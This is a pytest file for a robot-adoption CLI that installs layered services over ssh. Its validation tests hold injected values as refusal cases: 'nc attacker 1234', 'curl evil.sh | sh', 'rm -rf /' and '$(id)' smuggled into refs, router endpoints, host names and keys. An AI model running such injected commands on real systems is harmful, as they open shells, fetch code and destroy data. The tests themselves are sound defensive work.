"""fm device adopt — the five layers a robot's vendor OS is given, and their order."""

import subprocess

import pytest

from fm_tools.cli import adopt, device, exits


@pytest.fixture
def ran(monkeypatch):
    """Capture the commands adopt would have run instead of running them."""
    calls = []

    def fake(command):
        calls.append(command)
        return exits.OK

    monkeypatch.setattr(device, "_run", fake)
    return calls


def test_an_anvil_takes_all_five_steps_in_order():
    assert [step.name for step in adopt.plan("anvil-openarm-v2")] == [
        "tailscale",
        "fm-tools",
        "machine-init",
        "fm-comms",
        "fm-robot-agent",
    ]


def test_an_axol_takes_the_endpoint_role_where_an_anvil_takes_a_bridge():
    # It publishes its own joint states from the agent and has no DDS graph for
    # a bridge to join, so installing one would place a service carrying nothing.
    assert [step.name for step in adopt.plan("axol")] == [
        "tailscale",
        "fm-tools",
        "machine-init",
        "fm-comms-endpoint",
        "fm-robot-agent",
    ]


def test_an_axol_installs_no_bridge():
    scripts = "\n".join(step.script for step in adopt.plan("axol"))
    assert "--role bridge" not in scripts
    assert "--role endpoint" in scripts


def test_every_robot_gets_the_fleet_env_file_before_the_agent():
    """The agent's own installer refuses without it, so the order is the contract."""
    for kind in ("anvil-openarm-v2", "axol"):
        names = [step.name for step in adopt.plan(kind)]
        assert names.index("fm-robot-agent") == len(names) - 1
        assert any(name.startswith("fm-comms") for name in names)


def test_the_robot_joins_the_tailnet_under_its_own_tag():
    tailscale = adopt.plan("axol")[0]
    assert "--advertise-tags=tag:fm-robot" in tailscale.script


def test_the_card_names_the_role_and_the_robot():
    init = next(s for s in adopt.plan("axol") if s.name == "machine-init")
    assert "--role robot" in init.script
    assert "--robot axol" in init.script


def test_only_an_anvil_card_carries_a_workload():
    # A workload on an Axol would let a later bridge install render the arm
    # profile, which is the one that accepts inbound jog commands.
    anvil = next(s for s in adopt.plan("anvil-openarm-v2") if s.name == "machine-init")
    axol = next(s for s in adopt.plan("axol") if s.name == "machine-init")
    assert "--workload robot" in anvil.script
    assert "--workload" not in axol.script


def test_the_agent_role_follows_the_robot_kind():
    anvil = adopt.plan("anvil-openarm-v2")[-1]
    axol = adopt.plan("axol")[-1]
    assert "--role anvil" in anvil.script
    assert "--role axol" in axol.script


def test_every_package_a_step_layers_is_ledgered():
    for step in adopt.plan("anvil-openarm-v2"):
        if not step.packages:
            continue
        assert f"{adopt.LEDGER_DIR}/{step.name}" in step.script
        for package in step.packages:
            assert package in step.script


def test_no_step_reaches_past_what_it_added():
    # Both of these remove packages this flow never claimed, on a machine the
    # vendor still supports.
    for step in adopt.plan("anvil-openarm-v2"):
        assert "autoremove" not in step.script
        assert "purge" not in step.script


@pytest.mark.parametrize("kind", adopt.ROBOT_KINDS)
def test_every_step_is_shell_the_robot_can_parse(kind):
    # The scripts are assembled here and run on hardware, where a syntax error
    # surfaces as a half-layered robot rather than as a failing test.
    for step in adopt.plan(kind, "fm-rob-01"):
        body = "\n".join((adopt.PREAMBLE, step.script))
        checked = subprocess.run(["bash", "-n"], input=body, text=True, capture_output=True)
        assert checked.returncode == 0, f"{step.name}: {checked.stderr}"


def test_a_dry_run_prints_the_steps_and_runs_none(ran, capsys):
    code = device.run_device(
        ["adopt", "anvil-workcell", "--role", "robot", "--robot", "anvil-openarm-v2", "--dry-run"]
    )
    out = capsys.readouterr().out
    assert code == exits.OK
    assert ran == []
    for name in ("tailscale", "fm-tools", "machine-init", "fm-comms", "fm-robot-agent"):
        assert name in out


def test_adopt_runs_one_ssh_per_step(ran):
    code = device.run_device(
        ["adopt", "anvil-workcell", "--role", "robot", "--robot", "anvil-openarm-v2"]
    )
    assert code == exits.OK
    assert len(ran) == 5
    assert all(command[:3] == ["ssh", "-t", "anvil-workcell"] for command in ran)


def test_a_failed_step_stops_the_ones_after_it(monkeypatch):
    calls = []

    def fake(command):
        calls.append(command)
        return exits.PRECONDITION

    monkeypatch.setattr(device, "_run", fake)
    code = device.run_device(["adopt", "rob", "--role", "robot", "--robot", "axol"])
    assert code == exits.PRECONDITION
    assert len(calls) == 1


def test_every_step_stops_on_its_own_first_failure(ran):
    device.run_device(["adopt", "rob", "--role", "robot", "--robot", "axol"])
    # Without this a step that fails halfway carries on and leaves the robot
    # layered with a service configured against a card nobody wrote.
    assert all("set -euo pipefail" in command[-1] for command in ran)


@pytest.mark.parametrize(
    "argv",
    [
        ["adopt"],
        ["adopt", "host", "--role", "robot"],
        ["adopt", "host", "--role", "robot", "--robot", "forklift"],
        ["adopt", "host", "--role", "jetson", "--robot", "axol"],
        ["adopt", "host", "--role", "robot", "--robot", "axol", "--name", "fm-rec-01"],
        ["adopt", "host; rm -rf /", "--role", "robot", "--robot", "axol"],
        ["adopt", "one", "two", "--role", "robot", "--robot", "axol"],
        ["adopt", "host", "--role", "robot", "--robot", "axol", "--nonsense"],
    ],
)
def test_a_command_line_that_cannot_be_honoured_is_a_usage_error(argv, ran):
    assert device.run_device(argv) == exits.USAGE
    assert ran == []


# --- pinned refs -------------------------------------------------------------


def _scripts(kind="anvil-openarm-v2", ref=""):
    return "\n".join(step.script for step in adopt.plan(kind, ref=ref))


def test_every_adopted_repo_has_a_pinned_ref():
    """A repo reached without a pin is a repo whose default branch reaches a robot."""
    assert set(adopt.REFS) == {"fm-tools", "fm-setup", "fm-comms", "fm-robot-agent"}


def test_no_step_fetches_a_default_branch():
    scripts = _scripts()
    assert "/main/" not in scripts
    assert "--branch main" not in scripts


def test_each_pinned_ref_reaches_its_own_step():
    scripts = _scripts()
    for repo, ref in adopt.REFS.items():
        assert ref in scripts, f"{repo} is not fetched at {ref}"


def test_a_checkout_is_detached_and_never_pulls():
    """A pinned tag has no upstream; a pull on it would move the host off the pin."""
    scripts = _scripts()
    assert "checkout --quiet --detach" in scripts
    assert "git pull" not in scripts


def test_a_tag_is_resolved_before_a_branch_of_the_same_name():
    scripts = _scripts()
    assert scripts.index("refs/tags/") < scripts.index("refs/remotes/origin/")


def test_a_missing_ref_fails_the_step_rather_than_installing_something_else():
    assert "has no ref" in _scripts()


def test_an_override_applies_to_every_repo_at_once():
    """A host layered from a mix of a branch and three tags is not reproducible."""
    scripts = _scripts(ref="feat/robots-as-devices")
    assert scripts.count("feat/robots-as-devices") >= len(adopt.REFS)
    for ref in adopt.REFS.values():
        assert ref not in scripts


def test_an_axol_override_covers_its_steps():
    scripts = _scripts(kind="axol", ref="feat/robots-as-devices")
    assert "--role bridge" not in scripts
    assert "feat/robots-as-devices" in scripts
    for ref in adopt.REFS.values():
        assert ref not in scripts


def test_a_repo_with_no_pin_is_refused():
    with pytest.raises(KeyError):
        adopt.ref_for("fm-desktop")


def test_an_override_needs_no_pin():
    assert adopt.ref_for("fm-desktop", "v1.2.3") == "v1.2.3"


# --- a ref reaches a root shell, so it is checked ----------------------------


@pytest.mark.parametrize(
    "ref",
    [
        'v1.0.0"; nc attacker 1234 && echo "x',
        "v1.0.0; rm -rf /",
        "v1.0.0 && curl evil.sh | sh",
        "$(id)",
        "`id`",
        "v1.0.0\nsudo rm -rf /",
        "main..evil",
        "refs/heads/x.lock",
        "-v1.0.0",
        "",
        "v" * 200,
    ],
)
def test_a_ref_that_is_not_a_ref_is_refused(ref):
    assert adopt.valid_ref(ref) is False


@pytest.mark.parametrize(
    "ref", ["v0.1.0-robots.1", "main", "feat/robots-as-devices", "v1.2.3", "abc1234"]
)
def test_a_real_ref_is_accepted(ref):
    assert adopt.valid_ref(ref) is True


def test_every_pinned_ref_passes_its_own_check():
    for repo, ref in adopt.REFS.items():
        assert adopt.valid_ref(ref), f"{repo} is pinned to an unusable ref"


def test_an_injected_ref_never_reaches_a_rendered_script():
    with pytest.raises(ValueError):
        adopt.ref_for("fm-tools", "v1.0.0; rm -rf /")


def test_the_cli_refuses_an_injected_ref_before_any_ssh(ran):
    code = device.run_device(
        [
            "adopt", "anvil-workcell", "--role", "robot",
            "--robot", "anvil-openarm-v2", "--ref", "v1.0.0; rm -rf /",
        ]
    )
    assert code == exits.USAGE
    assert ran == []


# --- the router endpoint -----------------------------------------------------


@pytest.mark.parametrize(
    "endpoint",
    ["tcp/rune:7447", "tcp/100.111.147.125:7447", "tcp/adiis-mac-mini.tailbd5302.ts.net:7447"],
)
def test_a_real_locator_is_accepted(endpoint):
    assert adopt.valid_router(endpoint) is True


@pytest.mark.parametrize(
    "endpoint",
    [
        "tcp/rune:7447; rm -rf /",
        "tcp/$(id):7447",
        "tcp/`id`:7447",
        "rune:7447",
        "tcp/rune",
        "tcp/rune:notaport",
        "",
    ],
)
def test_a_locator_that_is_not_one_is_refused(endpoint):
    assert adopt.valid_router(endpoint) is False


def test_the_cli_refuses_an_injected_router_before_any_ssh(ran):
    code = device.run_device(
        [
            "adopt", "anvil-workcell", "--role", "robot",
            "--robot", "anvil-openarm-v2", "--router", "tcp/rune:7447; rm -rf /",
        ]
    )
    assert code == exits.USAGE
    assert ran == []


@pytest.mark.parametrize("kind", ["anvil-openarm-v2", "axol"])
def test_the_router_reaches_the_fm_comms_step_of_either_kind(kind):
    step = next(s for s in adopt.plan(kind, router="tcp/rune:7447") if s.name.startswith("fm-comms"))
    assert "export FM_ROUTER_ENDPOINT=tcp/rune:7447" in step.script


def test_the_router_is_exported_rather_than_written_into_the_file():
    """fm-comms owns that file's format; a second writer is the drift it warns about."""
    scripts = "\n".join(s.script for s in adopt.plan("axol", router="tcp/rune:7447"))
    assert "fm-comms.env" not in scripts


def test_no_router_export_appears_when_none_was_given():
    scripts = "\n".join(s.script for s in adopt.plan("axol"))
    assert "FM_ROUTER_ENDPOINT" not in scripts


# --- the tailnet a robot already has -----------------------------------------


def test_joining_never_evicts_a_tailnet_the_robot_already_has():
    """A vendor-supported robot may already be a node on the vendor's tailnet."""
    step = adopt.plan("axol")[0]
    assert "tailscale login" in step.script
    assert "tailscale up" not in step.script
    assert "logout" not in step.script


def test_the_authkey_is_forwarded_to_the_tailscale_step_only(monkeypatch):
    monkeypatch.setenv(adopt.AUTHKEY_VAR, "tskey-secret")
    assert adopt._authkey_prefix("tailscale", "tskey-secret").startswith("export TS_AUTHKEY=")
    assert adopt._authkey_prefix("fm-robot-agent", "tskey-secret") == ""


def test_no_authkey_means_no_export_line():
    assert adopt._authkey_prefix("tailscale", "") == ""


def test_an_authkey_is_quoted_before_it_reaches_a_shell():
    assert adopt._authkey_prefix("tailscale", "tskey; rm -rf /") == (
        "export TS_AUTHKEY='tskey; rm -rf /'\n"
    )


def test_a_dry_run_never_prints_the_key(monkeypatch, capsys):
    monkeypatch.setenv(adopt.AUTHKEY_VAR, "tskey-secret")
    device.run_device(
        ["adopt", "fm-rob-02", "--role", "robot", "--robot", "axol", "--dry-run"]
    )
    printed = capsys.readouterr().out
    assert "tskey-secret" not in printed
    assert "<redacted, from this shell>" in printed


def test_every_step_gets_a_pty_so_sudo_can_prompt(ran):
    """Each step runs sudo; a vendor-supported robot keeps a password on it."""
    device.run_device(
        ["adopt", "fm-rob-02", "--role", "robot", "--robot", "axol"]
    )
    assert ran, "no ssh was attempted"
    for command in ran:
        assert command[:3] == ["ssh", "-t", "fm-rob-02"]


def test_the_installed_wheel_matches_the_checkout():
    """fm-tools defaults the wheel to a release tag that a prerelease has not cut."""
    step = next(s for s in adopt.plan("axol") if s.name == "fm-tools")
    assert f"export FM_TOOLS_REF={adopt.REFS['fm-tools']}" in step.script


def test_an_override_reaches_the_wheel_too():
    step = next(
        s for s in adopt.plan("axol", ref="feat/robots-as-devices") if s.name == "fm-tools"
    )
    assert "export FM_TOOLS_REF=feat/robots-as-devices" in step.script
    assert adopt.REFS["fm-tools"] not in step.script


def test_joining_the_tailnet_opens_no_remote_shell():
    """Tailscale SSH takes over port 22 and is not in the ACL this plan describes."""
    step = adopt.plan("axol")[0]
    assert "login --ssh" not in step.script


def test_a_rerun_turns_tailscale_ssh_off_rather_than_leaving_it():
    """A robot an earlier run enabled it on must converge, not stay as it was."""
    step = adopt.plan("axol")[0]
    assert "tailscale set --ssh=false" in step.script


# --- every repo is fetched at the ref adopt pinned ----------------------------


def test_fm_comms_is_handed_its_own_tag():
    """Its install.sh re-clones itself at FM_TAG, defaulting to a release we have not cut."""
    for kind in ("anvil-openarm-v2", "axol"):
        step = next(s for s in adopt.plan(kind) if s.name.startswith("fm-comms"))
        assert f"export FM_TAG={adopt.REFS['fm-comms']}" in step.script


def test_the_agent_is_installed_from_a_checkout_not_a_pipe():
    """Its installer renders a unit from a template beside itself; a pipe has none."""
    step = next(s for s in adopt.plan("axol") if s.name == "fm-robot-agent")
    assert "git clone" in step.script
    assert "| bash" not in step.script
    assert "fm-robot-agent/install.sh --role axol" in step.script


def test_the_agent_checkout_honours_an_override():
    step = next(
        s for s in adopt.plan("axol", ref="feat/robots-as-devices")
        if s.name == "fm-robot-agent"
    )
    assert "feat/robots-as-devices" in step.script
    assert adopt.REFS["fm-robot-agent"] not in step.script


# --- the DDS domain a robot's own stack runs on -------------------------------


@pytest.mark.parametrize("domain", ["0", "1", "42", "232"])
def test_a_real_domain_is_accepted(domain):
    assert adopt.valid_domain(domain) is True


@pytest.mark.parametrize("domain", ["233", "-1", "1; id", "abc", "", "01x", "999"])
def test_a_domain_that_is_not_one_is_refused(domain):
    assert adopt.valid_domain(domain) is False


def test_the_cli_refuses_a_bad_domain_before_any_ssh(ran):
    code = device.run_device(
        ["adopt", "fm-rob-01", "--role", "robot", "--robot", "axol", "--ros-domain", "999"]
    )
    assert code == exits.USAGE
    assert ran == []


@pytest.mark.parametrize("kind", ["anvil-openarm-v2", "axol"])
def test_the_domain_reaches_the_fm_comms_step_of_either_kind(kind):
    step = next(
        s for s in adopt.plan(kind, router="tcp/rune:7447", domain="1")
        if s.name.startswith("fm-comms")
    )
    # Both spellings: the unit exports ROS_DOMAIN_ID from the file, and the
    # rendered config reads FM_ROS_DOMAIN_ID.
    assert "export FM_ROS_DOMAIN_ID=1" in step.script
    assert "export ROS_DOMAIN_ID=1" in step.script


def test_no_domain_given_leaves_the_fleet_default_alone():
    step = next(s for s in adopt.plan("axol", router="tcp/rune:7447") if s.name.startswith("fm-comms"))
    assert "DOMAIN_ID" not in step.script
    assert "FM_ROUTER_ENDPOINT" in step.script


# --- reading the robot's own config -------------------------------------------


def test_an_anvil_reads_its_own_vendor_config():
    """The robot already records its domain and interface; typing them again drifts."""
    step = next(s for s in adopt.plan("anvil-openarm-v2") if s.name.startswith("fm-comms"))
    assert '"$HOME/anvil-loader/.env.config"' in step.script
    assert "ROS_DOMAIN_ID" in step.script
    assert "CYCLONEDDS_IFACE" in step.script
    assert "FM_DDS_IFACE" in step.script


def test_an_axol_reads_no_vendor_config():
    """It has no such file; the endpoint role needs neither value."""
    step = next(s for s in adopt.plan("axol") if s.name.startswith("fm-comms"))
    assert "anvil-loader" not in step.script


def test_an_absent_vendor_config_is_not_a_failure():
    step = next(s for s in adopt.plan("anvil-openarm-v2") if s.name.startswith("fm-comms"))
    assert 'if [ -f "$vendor_env" ]; then' in step.script


def test_an_explicit_domain_wins_over_the_vendor_config():
    """The read sets a default; anything passed is exported after it."""
    step = next(
        s for s in adopt.plan("anvil-openarm-v2", domain="7")
        if s.name.startswith("fm-comms")
    )
    assert step.script.index("anvil-loader") < step.script.index("export FM_ROS_DOMAIN_ID=7")


def test_a_vendor_value_that_is_not_plain_is_refused():
    """That file is the vendor's; a value from it reaches a shell and a terminal."""
    step = next(s for s in adopt.plan("anvil-openarm-v2") if s.name.startswith("fm-comms"))
    assert 'case "$value" in *[!A-Za-z0-9._-]*) value="" ;; esac' in step.script
    # Refused before it is exported, and before it is echoed.
    assert step.script.index('case "$value"') < step.script.index('export FM_ROS_DOMAIN_ID="$value"')
